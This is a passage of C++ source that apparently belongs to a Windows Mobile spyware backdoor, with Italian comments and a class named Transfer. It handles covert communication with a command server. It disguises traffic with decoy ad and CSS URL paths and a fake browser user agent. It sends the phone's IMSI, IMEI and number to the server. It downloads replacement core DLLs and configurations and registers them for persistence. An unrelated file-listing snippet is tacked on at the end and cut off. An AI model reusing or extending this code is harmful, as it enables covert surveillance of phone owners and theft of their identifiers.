	if (pClearRequest[uResponseLen - 20] > 100 * 1024 * 1024) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendCommand() FAILED [Decryption failed 2]\n", 4, TRUE);
		delete[] pClearRequest;
		return NULL;
	}

	c.append((UCHAR *)&pClearRequest[uResponseLen - 20], 20);
	hash.Sha1(pClearRequest, uResponseLen - 20, sha1);

	if (memcmp(c.getBuf(), sha1, 20)) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendCommand() FAILED [Message Corrupted]\n", 4, TRUE);
		delete[] pClearRequest;
		return NULL;
	}

	// Rimuoviamo lo SHA1
	uResponseLen -= 20;

	return pClearRequest;

}

BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pResponse, UINT &uResponseLen, BOOL bSetCookie) {
	
	HINTERNET hOpenHandle, hConnectHandle, hResourceHandle;

	// La dimensione dell'array wRequest
	#define REQUEST_SIZE 18

	WCHAR *wRequest[] = {
		L"/",
		L"/pagead/show_ads.js",
		L"/licenses/by-nc-nd/2.5/",
		L"/css-validator/",
		L"/stats.asp?site=actual",
		L"/static/js/common/jquery.js",
		L"/cgi-bin/m?ci=ads&amp;cg=0",
		L"/rss/homepage.xml",
		L"/index.shtml?refresh",
		L"/static/css/common.css",
		L"/flash/swflash.cab#version=8,0,0,0",
		L"/js/swfobjectLivePlayer.js?v=10-57-13",
		L"/css/library/global.css",
		L"/rss/news.rss",
		L"/comments/new.js",
		L"/feed/view?id=1&type=channel",
		L"/ajax/MessageComposerEndpoint.php?__a=1",
		L"/safebrowsing/downloads?client=navclient"
	};
	
	wstring strHeaders = L"Accept: */*\r\n";
	
	Rand r;
	
	if (strSyncServer.empty()) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [No Sync Server set]\n", 4, FALSE);
		return FALSE;
	}

	hOpenHandle = _InternetOpenW(L"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.6)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hOpenHandle == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [InternetOpen()] ", 4, TRUE);
		return FALSE;
	}

	hConnectHandle = _InternetConnectW(hOpenHandle, strSyncServer.c_str(), INTERNET_INVALID_PORT_NUMBER,
						NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (hConnectHandle == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [InternetConnect()] ", 4, TRUE);
		_InternetCloseHandle(hOpenHandle);
		return FALSE;
	}

	hResourceHandle = _HttpOpenRequestW(hConnectHandle, L"POST", wRequest[r.rand24() % REQUEST_SIZE], L"HTTP/1.0", NULL, NULL, 
		INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_COOKIES, 0);

	if (hResourceHandle == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpOpenRequest()] ", 4, TRUE);
		_InternetCloseHandle(hOpenHandle);
		_InternetCloseHandle(hConnectHandle);
		return FALSE;
	}

	// Impostiamo il cookie se ne abbiamo uno
	if (bSetCookie && strSessionCookie.empty()) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [bSetCookie && strSessionCookie.empty()]\n", 4, FALSE);
		_InternetCloseHandle(hOpenHandle);
		_InternetCloseHandle(hConnectHandle);
		_InternetCloseHandle(hResourceHandle);
		return FALSE;
	}

	if (bSetCookie) {
		wstring strCookie = L"Cookie: ";
		strCookie += strSessionCookie;
		strCookie += L"\r\n";

		// Cambiato 0 in HTTP_ADDREQ_FLAG_REPLACE testare
		//if (HttpAddRequestHeaders(hResourceHandle, strCookie.c_str(), -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD ) == FALSE) {
		//	HttpAddRequestHeaders(hResourceHandle, strCookie.c_str(), -1, 0);
		//}
		if (_HttpSendRequestW(hResourceHandle, strCookie.c_str(), strCookie.length(), pContent, uContentLen) == FALSE) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpSendRequest() [cookie not set]] ", 4, TRUE);
			_InternetCloseHandle(hOpenHandle);
			_InternetCloseHandle(hConnectHandle);
			_InternetCloseHandle(hResourceHandle);
			return FALSE;
		}
	} else {
		// Send POST request
		if (_HttpSendRequestW(hResourceHandle, NULL, 0, pContent, uContentLen) == FALSE) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpSendRequest()] ", 4, TRUE);
			_InternetCloseHandle(hOpenHandle);
			_InternetCloseHandle(hConnectHandle);
			_InternetCloseHandle(hResourceHandle);
			return FALSE;
		}
	}

	DWORD dwRead = 0;

	// Leggiamo la lunghezza della risposta
	BYTE buf[16];
	UINT uCounter = sizeof(buf);

	ZeroMemory(buf, sizeof(buf));
	
	if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_CONTENT_LENGTH, &buf, (DWORD *)&uCounter, &dwRead) == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpQueryInfo() content length]: ", 4, TRUE);
		_InternetCloseHandle(hOpenHandle);
		_InternetCloseHandle(hConnectHandle);
		_InternetCloseHandle(hResourceHandle);
		return FALSE;
	}

	uResponseLen = _wtoi((WCHAR *)buf);

	// Read server response
	pResponse = new(std::nothrow) BYTE[uResponseLen];

	if (pResponse == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [new()]\n", 4, FALSE);
		_InternetCloseHandle(hOpenHandle);
		_InternetCloseHandle(hConnectHandle);
		_InternetCloseHandle(hResourceHandle);
		return FALSE;
	}

	dwRead = 0;
	uCounter = 0;

	// Get the cookie
	if (strSessionCookie.empty()) {
		BYTE *cookie = NULL;

		if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
			DWORD lastErr = GetLastError();

			if (lastErr == ERROR_INSUFFICIENT_BUFFER) {
				uCounter += 2;

				cookie = new(std::nothrow) BYTE[uCounter];

				if (cookie == NULL) {
					DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [new HttpQueryInfo()]: ", 4, TRUE);
					delete[] pResponse;
					_InternetCloseHandle(hOpenHandle);
					_InternetCloseHandle(hConnectHandle);
					_InternetCloseHandle(hResourceHandle);
					return FALSE;
				}

				ZeroMemory(cookie, uCounter);
			} else if(lastErr == ERROR_HTTP_HEADER_NOT_FOUND){
				// bypass per UNISTALL
				uCounter = 0;
				//ho dovuto forzare questo ignobile goto perche' il while di que creava casini
				goto forceExit;
			} else {
				DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpQueryInfo() 1]: ", 4, TRUE);
				delete[] pResponse;
				_InternetCloseHandle(hOpenHandle);
				_InternetCloseHandle(hConnectHandle);
				_InternetCloseHandle(hResourceHandle);
				return FALSE;
			}
		}

		dwRead = 0;

		if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpQueryInfo() 2 [cookie not set]]: ", 4, TRUE);
			delete[] pResponse;
			_InternetCloseHandle(hOpenHandle);
			_InternetCloseHandle(hConnectHandle);
			_InternetCloseHandle(hResourceHandle);
			return FALSE;
		}

		strSessionCookie = (WCHAR *)cookie;
		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() Cookie Set\n", 4, FALSE);
		delete[] cookie;
	}

	uCounter = 0;

forceExit:

	do {
		if (_InternetReadFile(hResourceHandle, pResponse + uCounter, uResponseLen - uCounter, &dwRead) == FALSE) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [InternetReadFile()]\n", 4, TRUE);
			delete[] pResponse;
			pResponse = NULL;
			uResponseLen = 0;
			_InternetCloseHandle(hOpenHandle);
			_InternetCloseHandle(hConnectHandle);
			_InternetCloseHandle(hResourceHandle);
			break;
		}

		// EOF
		if (dwRead == 0)
			break;

		uCounter += dwRead;

	} while (1);
 
	_InternetCloseHandle(hOpenHandle);
	_InternetCloseHandle(hConnectHandle);
	_InternetCloseHandle(hResourceHandle);
	
	return TRUE;
}

UINT Transfer::RestAuth() {
	
	#define BLOCK_SIZE 16	// AES Block Size

	UINT uContentLen, uResponseLen;

	// Puliamo il cookie
	strSessionCookie = L"";
	strSessionCookie.clear();

	// Puliamo il vettore degli availables
	vAvailables.clear();

	// Creiamo il request cifrato
	PBYTE pEncRequest = RestCreateAuthRequest(&uContentLen);

	// Phase 1 - Invia il request e leggi il response
	PBYTE pEncryptedResponse = NULL;

	// Non aggiungere il cookie
	if (RestPostRequest(pEncRequest, uContentLen, pEncryptedResponse, uResponseLen, FALSE) == FALSE) {
		delete[] pEncRequest;
		strSessionCookie.clear();
		ZeroMemory(K, sizeof(K));
		DBG_TRACE(L"Debug - Transfer.cpp - RestAuth() FAILED [RestPostRequest()]\n", 4, TRUE);
		return INVALID_COMMAND;
	}

	// Phase 2 - Decodifica il response del server ed ottieni il comando
	UINT uResponse = RestGetCommand(pEncryptedResponse);

	delete[] pEncRequest;

	if (uResponse == INVALID_COMMAND) {
		delete[] pEncryptedResponse;	
		strSessionCookie.clear();
		ZeroMemory(K, sizeof(K));
		DBG_TRACE(L"Debug - Transfer.cpp - RestAuth() FAILED [RestGetCommand()]\n", 4, TRUE);
		return INVALID_COMMAND;
	}
	
	return uResponse;
	
	return NULL;
}

UINT Transfer::RestGetCommand(BYTE* pContent) {
	
	if (RestDecryptK(pContent) == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestDecryptK() FAILED [RestDecryptK()]\n", 4, TRUE);
		return INVALID_COMMAND;
	}

	// Decifriamo il resto del pacchetto con K: Crypt(K, NonceDevice | Response)
	Encryption encK(K, 128);

	UINT uResponseLen = Encryption::GetPKCS5Len(20 + 4);
	PBYTE pClearResponse = encK.DecryptData(pContent + Encryption::GetPKCS5Len(16), &uResponseLen);

	// Estriamo il Nonce
	BYTE servNonce[16];

	CopyMemory(servNonce, pClearResponse, 16);

	if (memcmp(Nonce, servNonce, 16)) {
		delete[] pClearResponse;
		DBG_TRACE(L"Debug - Transfer.cpp - RestGetCommand() FAILED [Invalid Nonce Received]\n", 4, TRUE);
		return INVALID_COMMAND;
	}

	// Estraiamo il Response
	UINT uCommand;
	CopyMemory(&uCommand, pClearResponse + 16, 4);

	delete[] pClearResponse;

	// Ritorniamo il response del server
	return uCommand;
}

BOOL Transfer::RestDecryptK(BYTE *pContent) {
	BYTE *ks = new(std::nothrow) BYTE[Encryption::GetPKCS5Len(16)];

	if (ks == NULL) {
		ZeroMemory(K, sizeof(K));
		DBG_TRACE(L"Debug - Transfer.cpp - RestDecryptK() FAILED [new() ks]\n", 4, TRUE);
		return FALSE;
	}

	UINT uResponseLen = Encryption::GetPKCS5Len(16);

	Encryption encChallenge(g_Challenge, 128);
	BYTE *pClearResponse = encChallenge.DecryptData(pContent, &uResponseLen);

	// Valorizziamo Ks e liberiamo la prima parte del response
	CopyMemory(ks, pClearResponse, uResponseLen - Encryption::GetPKCS5Padding(uResponseLen));
	delete[] pClearResponse;

	// Calcoliamo K = sha1(ConfKey | Ks | Kd)
	Buffer k(16 + 16 + 16);

	// Costruiamo "ConfKey | Ks | Kd"
	k.append(g_ConfKey, 16);
	k.append(ks, 16);
	k.append((PUCHAR)&Kd, 16);

	delete[] ks;

	// Otteniamo K
	Hash hash;
	hash.Sha1(k.getBuf(), 16 + 16 + 16, (UCHAR *)&K);
	
	return TRUE;
}

BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
	
	// Kd (16), Nonce (16), BackdoorId (14), InstanceId (20), Subtype (16), sha1 (20)
	UINT uContentLen = Encryption::GetPKCS5Len(16 + 16 + 16 + 20 + 16 + 20);
	UINT uPadding = Encryption::GetPKCS5Padding(16 + 16 + 16 + 20 + 16 + 20);

	Buffer b(uContentLen);

	// Formato del primo request di auth
	// Crypt(ChallengeKey, Kd | NonceDevice | BackdoorId | InstanceId | SubType | sha1(BackdoorId | InstanceId | SubType | ConfKey))
	Rand r;

	UINT index;

	// Generiamo Kd
	for (index = 0; index < 4; index++)
		Kd[index] = r.rand32();

	// Generiamo il Nonce
	for (index = 0; index < 4; index++)
		Nonce[index] = r.rand32();

	// Copia Kd
	b.append((PUCHAR)&Kd, 16);

	// Copia Nonce
	b.append((PUCHAR)&Nonce, 16);

	// Copia BackdoorId
	b.append(g_BackdoorID, 16);

	// Copia InstanceId
	b.append(g_InstanceId, 20);

	// Aggiungi la demo string
	if (Task::getDemo()) {
		int k, i;

		//"WINPHONE\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		
		// WINMO-DEMO\x00\x00\x00\x00\x00\x00 ^ Q (Q e' progressivo)
		//BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x19, 0x1a, 0x7b, 0x13, 0x1d, 0x14, 0x15, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60 };

		//"WINPHONE-DEMO\x00\x00\x00";
		BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x04, 0x1d, 0x19, 0x19, 0x1d, 0x74, 0x1e, 0x1e, 0x11, 0x12, 0x5e, 0x5f, 0x60 };

		for (i = 0, k = 'Q'; i < 16; i++, k++) {
			subtype[i] ^= k;
		}
		
		

		b.append(subtype, 16);
	} else {
		// Copia SubType
		b.append(g_Subtype, 16);
	}

	// Calcola lo sha1(BackdoorId | InstanceId | SubType | ConfKey)
	Hash hash;
	Buffer h(16 + 20 + 16 + 16);

	// Copiamo nel buffer: BackdoorId | InstanceId | SubType
	h.append((PUCHAR)b.getBuf() + 32, 16 + 20 + 16);

	// Accodiamo la ConfKey
	h.append(g_ConfKey, 16);

	// Calcoliamo lo SHA1 del request buffer
	UCHAR uSha[20];
	hash.Sha1(h.getBuf(), 16 + 20 + 16 + 16, uSha);

	// Copiamo lo SHA1 nel buffer
	b.append(uSha, 20);

	// Inseriamo il padding
	b.repeat(uPadding, uPadding);

	Encryption encChallenge(g_Challenge, 128);

	PBYTE pEncRequest = encChallenge.EncryptData((PUCHAR)b.getBuf(), &uContentLen);
	
	*uEncContentLen = uContentLen;
	
	return pEncRequest;
	
}

BOOL Transfer::RestIdentification() {
	
	// Costruiamo il pacchetto di identificazione
	// PROTO_ID + Backdoor Version + UserId + DeviceId + SourceId + SHA1
	wstring strImsi = deviceObj->GetImsi();
	wstring strImei = deviceObj->GetImei();
	wstring strNumber = deviceObj->GetPhoneNumber();

	UINT uContentLen = Encryption::GetPKCS5Len(sizeof(PROTO_ID) + sizeof(g_Version) + 
						sizeof(UINT) + strImsi.size() * sizeof(WCHAR) + sizeof(WCHAR) +
						sizeof(UINT) + strImei.size() * sizeof(WCHAR) + sizeof(WCHAR) +
						sizeof(UINT) + strNumber.size() * sizeof(WCHAR) + sizeof(WCHAR) +
						20);

	// Utilizzata per lo SHA1
	UINT uRawContentLen = sizeof(PROTO_ID) + sizeof(g_Version) + 
		sizeof(UINT) + strImsi.size() * sizeof(WCHAR) + sizeof(WCHAR) +
		sizeof(UINT) + strImei.size() * sizeof(WCHAR) + sizeof(WCHAR) +
		sizeof(UINT) + strNumber.size() * sizeof(WCHAR) + sizeof(WCHAR);

	UINT uPadding = Encryption::GetPKCS5Padding(uRawContentLen + 20);

	Buffer b(uContentLen);

	if (b.ok() == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestIdentification() FAILED [Buffer()]\n", 4, TRUE);
		return FALSE;
	}

	// Inseriamo il comando
	UINT uCommand = PROTO_ID;
	b.append((PUCHAR)&uCommand, sizeof(PROTO_ID));

	// Inseriamo la Backdoor Version
	uCommand = g_Version;
	b.append((PUCHAR)&uCommand, sizeof(g_Version));

	// Inseriamo l'UserID
	UINT uPascalLen;
	uPascalLen = strImsi.size() * sizeof(WCHAR) + sizeof(WCHAR);

	b.append((PUCHAR)&uPascalLen, sizeof(uPascalLen));
	b.append((PUCHAR)strImsi.c_str(), strImsi.size() * sizeof(WCHAR));
	b.repeat(0, sizeof(WCHAR));

	// Inseriamo il DeviceID
	uPascalLen = strImei.size() * sizeof(WCHAR) + sizeof(WCHAR);

	b.append((PUCHAR)&uPascalLen, sizeof(uPascalLen));
	b.append((PUCHAR)strImei.c_str(), strImei.size() * sizeof(WCHAR));
	b.repeat(0, sizeof(WCHAR));

	// Inseriamo il SourceID
	uPascalLen = strNumber.size() * sizeof(WCHAR) + sizeof(WCHAR);

	b.append((PUCHAR)&uPascalLen, sizeof(uPascalLen));
	b.append((PUCHAR)strNumber.c_str(), strNumber.size() * sizeof(WCHAR));
	b.repeat(0, sizeof(WCHAR));

	// Inseriamo lo SHA1
	Hash hash;
	BYTE sha1[20];

	hash.Sha1((PBYTE)b.getBuf(), uRawContentLen, sha1);
	b.append((PUCHAR)sha1, 20);
	b.repeat((unsigned char)uPadding, uPadding);

	// Cifriamo il payload
	Encryption encK(K, 128);
	UINT uResponseLen, uPayloadLen = b.getSize();
	PBYTE pPayload = encK.EncryptData((BYTE *)b.getBuf(), &uPayloadLen);
	PBYTE pResponse = NULL;

	// Effettuiamo il request
	if (RestPostRequest(pPayload, uPayloadLen, pResponse, uResponseLen) == FALSE) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestIdentification() FAILED [RestPostRequest()]\n", 4, TRUE);
		return FALSE;
	}

	delete[] pPayload;

	// Decifriamo il request
	encK.Reset();
	PBYTE pClearResponse = encK.DecryptData(pResponse, &uResponseLen);

	delete[] pResponse;

	// Interpretiamolo
	// OK | Len | Date | Availables... 
	Buffer r(pClearResponse, uResponseLen);
	delete[] pClearResponse;

	// PROTO_OK?
	UINT val = r.getInt();

	if (val != PROTO_OK) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestIdentification() FAILED [Invalid Response]\n", 4, TRUE);
		return FALSE;
	}

	// Lunghezza dei dati dopo il primo int
	if (r.getInt() < 12) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestIdentification() FAILED [Response too short]\n", 4, TRUE);
		return FALSE;
	}

	ULARGE_INTEGER date;
	date.LowPart = r.getInt();
	date.HighPart = r.getInt();

	deviceObj->SetTimeDiff(date);

	// Lunghezza availables
	val = r.getInt();

	// Estraiamo i comandi da processare
	for (UINT i = 0; i < val; i++)
		vAvailables.push_back(r.getInt());
	
	return TRUE;
}

void Transfer::RestProcessAvailables() {
	
	vector<UINT>::iterator it;

	if (vAvailables.empty())
		return;

	for (it = vAvailables.begin(); it != vAvailables.end(); it++) {
		switch (*it) {
			case PROTO_NEW_CONF:
				bNewConf = RestGetNewConf();
				break;

			case PROTO_DOWNLOAD:
				RestSendDownloads();
				break;

			case PROTO_UPLOAD:
				RestGetUploads();
				break;

			case PROTO_FILESYSTEM:
				RestSendFilesystem();
				break;

			case PROTO_UPGRADE:
				RestGetUpgrade();
				break;

			default:
				break;
		}
	}
	
	return;
}

BOOL Transfer::RestGetUpgrade() {
	
	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_UPGRADE) + 20));
	Hash hash;

	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_UPGRADE) + 20);
	UINT uCommand = PROTO_UPGRADE;
	BYTE sha1[20];
	UINT uLeft;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);

	do {
		b.free();

		// Creiamo il request per il comando
		b.append((UCHAR *)&uCommand, sizeof(uCommand));
		b.append((BYTE *)sha1, 20);
		b.repeat(uPadding, uPadding);

		UINT uResponse = 0;
		BYTE *pResponse = NULL;

		pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

		if (pResponse == NULL) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [RestSendCommand()] ", 4, TRUE);
			return FALSE;
		}

		b.free();
		b.append(pResponse, uResponse);
		b.reset();

		ZeroMemory(pResponse, uResponse);
		delete[] pResponse;

		// Vediamo se la risposta e' un PROTO_NO (non ci sono uploads)
		if (b.getInt() == PROTO_NO) {
			return TRUE;
		}

		UINT uFileLen = b.getInt();

		uLeft = b.getInt();

		UINT uPascalLen = b.getInt();
		PWCHAR pwFilename = (PWCHAR)b.getCurBuf();

		// Ora il buffer punta al primo byte del pascal del file di upgrade
		b.setPos(b.getPos() + uPascalLen);
		uFileLen = b.getInt();

		// Verifichiamo il tipo di upgrade
		if (wcsncmp(L"core", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
			// Se conosciamo il nostro nome, switchiamo il nuovo core
			wstring strPathName = L"\\windows\\";

			if (g_strOurName.empty() == FALSE) {
				if (g_strOurName == MORNELLA_SERVICE_DLL_A)
					strPathName += MORNELLA_SERVICE_DLL_B;
				else
					strPathName += MORNELLA_SERVICE_DLL_A;

				hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

				if (hFile == INVALID_HANDLE_VALUE) {
					DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [CreateFile()]\n", 5, FALSE);
					continue;
				}
			} else { // Se non sappiamo qual'e' il nostro nome... Guessiamo
				strPathName += MORNELLA_SERVICE_DLL_A;

				hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

				if (hFile == INVALID_HANDLE_VALUE) {
					strPathName = L"\\windows\\";
					strPathName += MORNELLA_SERVICE_DLL_B;

					hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

					if (hFile == INVALID_HANDLE_VALUE) {
						DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [CreateFile() 2]\n", 5, FALSE);
						continue;
					}

					g_strOurName = MORNELLA_SERVICE_DLL_A;
				} else {
					g_strOurName = MORNELLA_SERVICE_DLL_B;
				}
			}

			wstring strNewCore;

			if (g_strOurName == MORNELLA_SERVICE_DLL_A)
				strNewCore = MORNELLA_SERVICE_DLL_B;
			else
				strNewCore = MORNELLA_SERVICE_DLL_A;

			DWORD dwWritten = 0;

			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
				CloseHandle(hFile);
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [WriteFile()]\n", 5, FALSE);
				continue;
			}

			FlushFileBuffers(hFile);
			CloseHandle(hFile);

			// Scriviamo la chiave nel registro
			HKEY hKey;

			if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, MORNELLA_SERVICE_PATH, 0, 0, &hKey) != ERROR_SUCCESS) {
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [RegOpenKeyEx()] ", 5, TRUE);
				continue;
			}

			// Aggiorniamo con il nome del nuovo core
			DWORD cbData = (strNewCore.size() * sizeof(WCHAR)) + sizeof(WCHAR);
			if (_RegSetValueEx(hKey, L"Dll", 0, REG_SZ, (BYTE *)strNewCore.c_str(), cbData) != ERROR_SUCCESS) {
				_RegCloseKey(hKey);
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [RegSetValueEx()] ", 5, TRUE);
				continue;
			}

			_RegCloseKey(hKey);
			_RegFlushKey(HKEY_LOCAL_MACHINE);
		} else {
			// Se conosciamo il nostro nome, switchiamo il nuovo core
			wstring strPathName = L"\\windows\\";

			if (wcsncmp(L"smsfilter", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
				strPathName += L"SmsFilter.dll";
			} else {
				strPathName += pwFilename;
			}

			hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile == INVALID_HANDLE_VALUE) {
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [CreateFile() 2]\n", 5, FALSE);
				continue;
			}

			DWORD dwWritten = 0;

			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
				CloseHandle(hFile);
				DeleteFile(strPathName.c_str());

				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [WriteFile() failed]\n", 5, FALSE);
				continue;
			}

			if (dwWritten < uFileLen) {
				CloseHandle(hFile);
				DeleteFile(strPathName.c_str());

				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [WriteFile() wrote less data than expected]\n", 5, FALSE);
				continue;
			}

			FlushFileBuffers(hFile);
			CloseHandle(hFile);
		}
	} while (uLeft);

	FlushFileBuffers(hFile);
	
	return TRUE;
}

BOOL Transfer::RestGetNewConf() {
	
	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_NEW_CONF) + 20));
	Hash hash;

	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + 20);
	UINT uCommand = PROTO_NEW_CONF;
	BYTE sha1[20];

	hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);

	// Creiamo il request per il comando
	b.append((UCHAR *)&uCommand, sizeof(uCommand));
	b.append((BYTE *)sha1, 20);
	b.repeat(uPadding, uPadding);

	UINT uResponse = 0;
	BYTE *pResponse = NULL;

	pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

	if (pResponse == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [RestSendCommand()] ", 4, TRUE);
		return FALSE;
	}

	b.free();
	b.append(pResponse, uResponse);
	b.reset();

	ZeroMemory(pResponse, uResponse);
	delete[] pResponse;

	// Vediamo se la risposta e' un PROTO_NO (non ci sono new conf)
	if (b.getInt() == PROTO_NO) {
		return TRUE;
	}

	// Otteniamo la lunghezza della configurazione
	UINT uConfLen = b.getInt();

	// Scriviamo la nuova conf
	Conf localConfObj;
	wstring strBackName;
	HANDLE hBackup = INVALID_HANDLE_VALUE;	
	DWORD dwWritten = 0;

	strBackName = localConfObj.GetBackupName(TRUE);

	if (strBackName.empty()) {
		return FALSE;		
	}

	hBackup = _CreateFileW(strBackName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hBackup == INVALID_HANDLE_VALUE) {
		RestSendConfAck(FALSE);
		return FALSE;
	}

	if (WriteFile(hBackup, (BYTE *)b.getCurBuf(), uConfLen, &dwWritten, NULL) == FALSE) {
		CloseHandle(hBackup);
		DeleteFile(GetCurrentPathStr(strBackName).c_str());
		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [Cannot write new conf] ", 4, TRUE);

		RestSendConfAck(FALSE);
		return FALSE;
	}

	FlushFileBuffers(hBackup);
	CloseHandle(hBackup);

	if (dwWritten != uConfLen) {
		DeleteFile(GetCurrentPathStr(strBackName).c_str());
		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [Cannot completely write new conf] ", 4, TRUE);

		RestSendConfAck(FALSE);
		return FALSE;
	}

	// Verifichiamo il CRC della nuova conf
	Encryption enc(g_ConfKey, KEY_LEN);
	UINT uLen = 0;

	strBackName = localConfObj.GetBackupName(FALSE);
	PBYTE pConf = enc.DecryptConf(strBackName, &uLen);

	if (pConf == NULL || uLen == 0) {
		Log logInfo;
		logInfo.WriteLogInfo(L"Corrupted configuration received");
		DeleteFile(GetCurrentPathStr(strBackName).c_str());
		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [Invalid new conf, deleting it] ", 4, TRUE);

		// Nuova conf non valida
		RestSendConfAck(FALSE);

		if (pConf)
			delete[] pConf;

		return FALSE;
	}

	ZeroMemory(pConf, uLen);
	delete[] pConf;

	Log logInfo;
	logInfo.WriteLogInfo(L"New configuration received");

	// Torniamo un OK per la nuova configurazione
	RestSendConfAck(TRUE);
	
	return TRUE;
}

BOOL Transfer::RestSendConfAck(BOOL bConfOK) {
	
	Hash hash;
	BYTE sha1[20];
	UINT uConfOK, uCommand = PROTO_NEW_CONF;
	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_NEW_CONF) + sizeof(uConfOK) + 20);
	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_NEW_CONF) + sizeof(uConfOK) + 20));

	if (bConfOK == TRUE) 
		uConfOK = PROTO_OK;
	else
		uConfOK = PROTO_NO;

	// Creiamo il request per il comando
	b.append((UCHAR *)&uCommand, sizeof(uCommand));
	b.append((UCHAR *)&uConfOK, sizeof(uConfOK));

	hash.Sha1(b.getBuf(), sizeof(uCommand) + sizeof(uConfOK), sha1);

	b.append((BYTE *)sha1, 20);
	b.repeat(uPadding, uPadding);

	UINT uResponse = 0;
	BYTE *pResponse = NULL;

	pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

	if (pResponse == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendConfAck() FAILED [RestSendCommand()] ", 4, TRUE);
		return FALSE;
	}

	delete[] pResponse;
	
	return TRUE;
	
}




// Recursive directory traversal using the Win32 API
using namespace std;
#include <vector>
#include <stack>
bool ListFiles(wstring path, wstring mask, vector<wstring>& files)
{
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA fdata;
